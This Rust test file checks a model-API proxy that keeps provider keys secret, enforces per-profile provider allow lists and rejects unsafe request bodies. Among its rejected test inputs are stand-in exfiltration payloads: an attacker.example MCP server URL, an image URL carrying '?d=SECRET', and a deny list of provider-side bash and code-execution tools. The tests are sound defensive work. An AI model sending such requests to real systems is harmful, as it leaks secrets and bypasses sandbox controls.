use super::*;
use crate::testing::{FakeSecrets, FakeUpstream, ManualClock, MemLedger, run_context};

const KEY: &str = "provider-key-for-personal";

struct Rig {
    proxy: ModelProxy,
    ledger: Arc<MemLedger>,
    upstream: Arc<FakeUpstream>,
}

fn provider(name: &str, host: &str, secret: &str, aliases: &[(&str, &str)]) -> (String, Provider) {
    (
        name.to_owned(),
        Provider {
            endpoint: HostPort {
                host: host.into(),
                port: 443,
            },
            path: "/v1/messages".into(),
            secret: SecretName::parse(secret).unwrap(),
            header: "authorization".into(),
            scheme: Some("Bearer".into()),
            headers: vec![("x-api-version".into(), "1".into())],
            forward_headers: vec!["anthropic-version".into(), "anthropic-beta".into()],
            // "other"만 운영자가 최상위 필드 하나를 더 허용한 제공자다.
            body_fields: if name == "other" {
                vec!["x_extra".into()]
            } else {
                vec![]
            },
            models: aliases
                .iter()
                .map(|(a, m)| (a.to_string(), m.to_string()))
                .collect(),
        },
    )
}

fn rig(limits: impl FnOnce(&mut ModelLimits)) -> Rig {
    let host = ModelHost {
        providers: [
            provider(
                "main",
                "api.main.example",
                "model-key",
                &[("assistant", "model-large"), ("fast", "model-small")],
            ),
            provider(
                "other",
                "api.other.example",
                "model-key",
                &[("assistant", "other-large"), ("solo", "other-solo")],
            ),
            provider(
                "secret",
                "api.hidden.example",
                "model-key",
                &[("hidden", "hidden-1")],
            ),
        ]
        .into(),
        allow: [
            (ProfileId("personal".into()), ["main".to_owned()].into()),
            (
                ProfileId("both".into()),
                ["main".to_owned(), "other".to_owned()].into(),
            ),
            (ProfileId("solo".into()), ["other".to_owned()].into()),
        ]
        .into(),
    };
    let clock = Arc::new(ManualClock::new(1_000));
    let ledger = Arc::new(MemLedger::new(clock.clone()));
    for profile in ["personal", "both", "solo", "stranger"] {
        ledger.add_run(run_context(
            profile,
            &format!("run-{profile}"),
            1,
            "local:owner",
            "main",
            &["run"],
        ));
    }
    let secrets = Arc::new(FakeSecrets::new(&[
        ("personal", "model-key", KEY),
        ("both", "model-key", "both-key-value"),
        ("solo", "model-key", "solo-key-value"),
    ]));
    let upstream = Arc::new(FakeUpstream::new());
    let mut cfg = ModelLimits::default();
    limits(&mut cfg);
    let proxy = ModelProxy::new(host, ledger.clone(), secrets, upstream.clone(), clock, cfg);
    Rig {
        proxy,
        ledger,
        upstream,
    }
}

fn request(profile: &str, alias: &str, body: &str) -> ModelRequest {
    ModelRequest {
        attempt: Attempt {
            profile: ProfileId(profile.into()),
            run: RunId(format!("run-{profile}")),
            generation: Generation(1),
            claim: Some(ClaimEpoch(1)),
        },
        alias: alias.into(),
        body: JsonPayload(body.into()),
        headers: Vec::new(),
    }
}

async fn ask(r: &Rig, profile: &str, alias: &str, body: &str) -> Result<ModelResponse, Error> {
    r.proxy.forward(request(profile, alias, body)).await
}

#[tokio::test]
async fn the_key_goes_upstream_only_and_the_model_name_is_the_operators() {
    let r = rig(|_| {});
    let reply = ask(
        &r,
        "personal",
        "assistant",
        r#"{"messages":[{"role":"user","content":"hi"}],"model":"attacker-model"}"#,
    )
    .await
    .unwrap();
    assert_eq!(
        (reply.status, reply.body.0.as_str()),
        (200, "{\"ok\":true}")
    );
    let sent = r.upstream.requests();
    assert_eq!(sent.len(), 1);
    let (endpoint, path, headers, body) = &sent[0];
    assert_eq!(
        (endpoint.as_str(), path.as_str()),
        ("api.main.example:443", "/v1/messages")
    );
    assert!(headers.contains(&("authorization".into(), format!("Bearer {KEY}"))));
    assert!(headers.contains(&("x-api-version".into(), "1".into())));
    assert_eq!(
        body, r#"{"messages":[{"content":"hi","role":"user"}],"model":"model-large"}"#,
        "샌드박스가 보낸 model은 덮어쓴다"
    );
    assert!(
        !reply.body.0.contains(KEY) && !body.contains(KEY),
        "키는 응답·본문에 없다"
    );
}

#[tokio::test]
async fn providers_outside_the_profile_allow_list_are_never_contacted() {
    let r = rig(|_| {});
    // 운영자가 허용하지 않은 제공자의 별칭, 목록에 없는 별칭, 허용 목록이 없는 프로필
    for (profile, alias) in [
        ("personal", "hidden"),
        ("personal", "solo"),
        ("stranger", "assistant"),
        ("personal", "nope"),
    ] {
        assert!(
            matches!(ask(&r, profile, alias, "{}").await, Err(Error::Denied)),
            "{profile}/{alias}"
        );
    }
    assert!(r.upstream.requests().is_empty(), "미허용 제공자 접속 0건");
    // 허용한 제공자 둘이 같은 별칭을 주장하면 모호하므로 거절한다
    assert!(matches!(
        ask(&r, "both", "assistant", "{}").await,
        Err(Error::Denied)
    ));
    assert!(ask(&r, "solo", "solo", "{}").await.is_ok());
    assert_eq!(r.upstream.requests()[0].0, "api.other.example:443");
}

#[tokio::test]
async fn each_profile_uses_its_own_key_namespace() {
    let r = rig(|_| {});
    ask(&r, "personal", "assistant", "{}").await.unwrap();
    ask(&r, "solo", "solo", "{}").await.unwrap();
    let sent = r.upstream.requests();
    assert!(
        sent[0]
            .2
            .contains(&("authorization".into(), format!("Bearer {KEY}")))
    );
    assert!(
        sent[1]
            .2
            .contains(&("authorization".into(), "Bearer solo-key-value".into()))
    );
    // 키가 없는 프로필은 다른 프로필의 키로 대신하지 않는다
    r.ledger.add_run(run_context(
        "stranger",
        "run-stranger",
        1,
        "local:owner",
        "main",
        &["run"],
    ));
    assert!(matches!(
        ask(&r, "stranger", "assistant", "{}").await,
        Err(Error::Denied)
    ));
}

#[tokio::test]
async fn a_missing_key_sends_nothing() {
    let r = rig(|_| {});
    r.ledger.add_run(run_context(
        "both",
        "run-both",
        1,
        "local:owner",
        "main",
        &["run"],
    ));
    // both는 main·other가 모두 assistant를 주장하지만 fast는 main만 가졌고 키는 있다 → 정상
    assert!(ask(&r, "both", "fast", "{}").await.is_ok());
    // 허용 목록은 있지만 자격이 없는 프로필(solo가 아닌 새 프로필)
    let mut host = ModelHost::default();
    host.providers.extend([provider(
        "main",
        "api.main.example",
        "model-key",
        &[("assistant", "m")],
    )]);
    host.allow
        .insert(ProfileId("personal".into()), ["main".to_owned()].into());
    let clock = Arc::new(ManualClock::new(1_000));
    let ledger = Arc::new(MemLedger::new(clock.clone()));
    ledger.add_run(run_context(
        "personal",
        "run-personal",
        1,
        "local:owner",
        "main",
        &["run"],
    ));
    let upstream = Arc::new(FakeUpstream::new());
    let proxy = ModelProxy::new(
        host,
        ledger,
        Arc::new(FakeSecrets::new(&[])),
        upstream.clone(),
        clock,
        ModelLimits::default(),
    );
    assert!(matches!(
        proxy.forward(request("personal", "assistant", "{}")).await,
        Err(Error::Unavailable)
    ));
    assert!(upstream.requests().is_empty());
}

#[tokio::test]
async fn a_message_from_an_old_owner_never_reaches_the_provider() {
    let r = rig(|_| {});
    // claim이 없는 신원은 워커 연산을 인가하지 못한다
    let mut anonymous = request("personal", "assistant", "{}");
    anonymous.attempt.claim = None;
    assert!(matches!(
        r.proxy.forward(anonymous).await,
        Err(Error::Denied)
    ));
    // 같은 세대에서 새 리스를 잡은 뒤 옛 claim
    r.ledger.bump_claim("run-personal");
    assert!(
        matches!(
            ask(&r, "personal", "assistant", "{}").await,
            Err(Error::Stale)
        ),
        "옛 claim"
    );
    // 인계로 세대가 바뀐 뒤, 취소된 뒤
    let mut taken = request("personal", "assistant", "{}");
    taken.attempt.claim = Some(r.ledger.claim_epoch("run-personal"));
    r.ledger.bump_generation("run-personal");
    assert!(
        matches!(r.proxy.forward(taken).await, Err(Error::Stale)),
        "세대가 바뀐 뒤"
    );
    r.ledger.cancel("run-personal");
    assert!(
        r.upstream.requests().is_empty(),
        "옛 소유자의 요청은 상류까지 가지 않는다"
    );
}

#[tokio::test]
async fn request_bodies_must_be_clean_objects() {
    let r = rig(|c| c.max_request = 64);
    for bad in [
        "not json",
        "[1]",
        r#"{"a":1,"a":2}"#,
        r#"{"stream":true}"#,
        r#"{"n":9007199254740993}"#,
        &format!("{{\"x\":\"{}\"}}", "a".repeat(80)),
    ] {
        assert!(
            matches!(
                ask(&r, "personal", "assistant", bad).await,
                Err(Error::Invalid)
            ),
            "{bad}"
        );
    }
    assert!(
        ask(&r, "personal", "assistant", r#"{"stream":false}"#)
            .await
            .is_ok()
    );
    assert_eq!(r.upstream.requests().len(), 1);
}

#[tokio::test]
async fn a_response_that_echoes_the_key_is_withheld() {
    let r = rig(|_| {});
    r.upstream
        .respond(200, format!("{{\"echo\":\"{KEY}\"}}").as_bytes());
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Denied)
    ));
    // 이스케이프로 쓴 키(`\u0070rovider-key…`)도 디코딩한 값으로 잡는다
    let escaped = KEY.replacen('p', "\\u0070", 1);
    r.upstream
        .respond(200, format!("{{\"echo\":\"{escaped}\"}}").as_bytes());
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Denied)
    ));
    r.upstream
        .respond(200, format!("{{\"{escaped}\":1}}").as_bytes());
    assert!(
        matches!(
            ask(&r, "personal", "assistant", "{}").await,
            Err(Error::Denied)
        ),
        "키 이름에 숨겨도 막는다"
    );
    // 상류 오류는 본문 대신 상태만 돌려준다
    r.upstream
        .respond(429, b"{\"error\":\"account acct-123 is over quota\"}");
    let reply = ask(&r, "personal", "assistant", "{}").await.unwrap();
    assert_eq!(
        (reply.status, reply.body.0.as_str()),
        (429, r#"{"error":{"status":429}}"#)
    );
    // 형식이 깨졌거나 너무 큰 성공 응답은 쓰지 않는다
    r.upstream.respond(200, b"not json");
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Unavailable)
    ));
    r.upstream
        .respond(200, &vec![b'a'; ModelLimits::default().max_response + 1]);
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Unavailable)
    ));
    r.upstream.fail();
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Unavailable)
    ));
}

#[tokio::test]
async fn model_calls_are_rate_limited_per_principal() {
    let r = rig(|c| {
        c.rate = RateConfig {
            per_minute: 60,
            burst: 2,
            concurrent: 4,
        }
    });
    ask(&r, "personal", "assistant", "{}").await.unwrap();
    ask(&r, "personal", "assistant", "{}").await.unwrap();
    assert!(matches!(
        ask(&r, "personal", "assistant", "{}").await,
        Err(Error::Unavailable)
    ));
    assert_eq!(r.upstream.requests().len(), 2);
}

#[tokio::test]
async fn provider_side_tools_and_remote_connections_never_reach_the_upstream() {
    let r = rig(|_| {});
    let tool = r#"{"name":"skill_tool","description":"d","input_schema":{"type":"object"}}"#;
    let bad = [
        // 제공자 쪽에서 도는 도구(웹 검색·코드 실행·셸·편집기)
        r#"{"tools":[{"type":"web_search_20250305","name":"web_search"}]}"#,
        r#"{"tools":[{"type":"code_execution_20250522","name":"code_execution"}]}"#,
        r#"{"tools":[{"type":"bash_20250124","name":"bash"}]}"#,
        r#"{"tools":[{"type":"text_editor_20250124","name":"str_replace_editor"}]}"#,
        // type이 custom이어도 입력 형식이 없거나 모르는 필드가 있으면 거절한다
        r#"{"tools":[{"type":"custom","name":"x"}]}"#,
        r#"{"tools":[{"name":"x","input_schema":{},"max_uses":5}]}"#,
        r#"{"tools":[{"name":"bad name","input_schema":{}}]}"#,
        r#"{"tools":["web_search"]}"#,
        r#"{"tools":{"name":"x"}}"#,
        // 제공자가 대신 연결하거나 실행하는 최상위 기능
        r#"{"mcp_servers":[{"type":"url","url":"http://attacker.example/mcp","name":"s"}]}"#,
        r#"{"container":"container_abc"}"#,
        r#"{"service_tier":"auto"}"#,
        r#"{"x_extra":1}"#,
        // 모르는 도구 선택
        r#"{"tool_choice":"auto"}"#,
        r#"{"tool_choice":{"type":"web_search"}}"#,
        r#"{"tool_choice":{"type":"tool"}}"#,
        r#"{"tool_choice":{"type":"auto","name":"x"}}"#,
    ];
    for body in bad {
        assert!(
            matches!(
                ask(&r, "personal", "assistant", body).await,
                Err(Error::Invalid)
            ),
            "거절해야 한다: {body}"
        );
    }
    // 허용 도구 옆에 하나라도 섞이면 요청 전체를 거절한다
    let mixed =
        format!(r#"{{"tools":[{tool},{{"type":"web_search_20250305","name":"web_search"}}]}}"#);
    assert!(matches!(
        ask(&r, "personal", "assistant", &mixed).await,
        Err(Error::Invalid)
    ));
    assert!(
        r.upstream.requests().is_empty(),
        "상류에는 아무것도 가지 않았다"
    );
}

#[tokio::test]
async fn registered_client_tools_and_ordinary_fields_pass() {
    let r = rig(|_| {});
    let body = r#"{"max_tokens":64,"system":"s","metadata":{"user_id":"u"},"thinking":{"type":"enabled","budget_tokens":16},"temperature":0.2,"messages":[{"role":"user","content":"hi"}],"tools":[{"name":"skill_tool","description":"d","input_schema":{"type":"object","properties":{}},"cache_control":{"type":"ephemeral"}},{"type":"custom","name":"other-tool","input_schema":{}}],"tool_choice":{"type":"auto","disable_parallel_tool_use":true}}"#;
    ask(&r, "personal", "assistant", body).await.unwrap();
    let sent = r.upstream.requests();
    assert_eq!(sent.len(), 1);
    assert!(sent[0].3.contains("\"skill_tool\"") && sent[0].3.contains("\"model-large\""));
    // 도구를 이름으로 지정하는 선택도 받는다
    let named = r#"{"tools":[{"name":"skill_tool","input_schema":{}}],"tool_choice":{"type":"tool","name":"skill_tool"}}"#;
    ask(&r, "personal", "assistant", named).await.unwrap();
    let none = r#"{"tools":[],"tool_choice":{"type":"none"}}"#;
    ask(&r, "personal", "assistant", none).await.unwrap();
}

#[tokio::test]
async fn an_extra_body_field_is_allowed_only_for_the_provider_that_lists_it() {
    let r = rig(|_| {});
    let body = r#"{"messages":[],"x_extra":1}"#;
    assert!(matches!(
        ask(&r, "personal", "assistant", body).await,
        Err(Error::Invalid)
    ));
    ask(&r, "solo", "solo", body).await.unwrap();
    // 운영자가 정한 필드가 있어도 제공자 도구 선언은 막는다
    let tool = r#"{"x_extra":1,"tools":[{"type":"web_search_20250305","name":"web_search"}]}"#;
    assert!(matches!(
        ask(&r, "solo", "solo", tool).await,
        Err(Error::Invalid)
    ));
}

#[tokio::test]
async fn a_remote_attachment_never_reaches_the_upstream_but_an_inline_one_does() {
    let r = rig(|_| {});
    let remote = [
        r#"{"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://attacker.example/p.png?d=SECRET"}}]}]}"#,
        r#"{"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":{"type":"file","file_id":"file_1"}}]}]}]}"#,
        r#"{"messages":[{"role":"user","content":[{"type":"document","source":{"type":"url","url":"https://attacker.example/d.pdf"}}]}]}"#,
    ];
    for body in remote {
        assert!(
            matches!(
                ask(&r, "personal", "assistant", body).await,
                Err(Error::Invalid)
            ),
            "{body}"
        );
    }
    assert!(r.upstream.requests().is_empty());
    let inline = r#"{"messages":[{"role":"user","content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"iVBORw0KGgo="}}]}]}"#;
    ask(&r, "personal", "assistant", inline).await.unwrap();
    assert_eq!(r.upstream.requests().len(), 1);
}
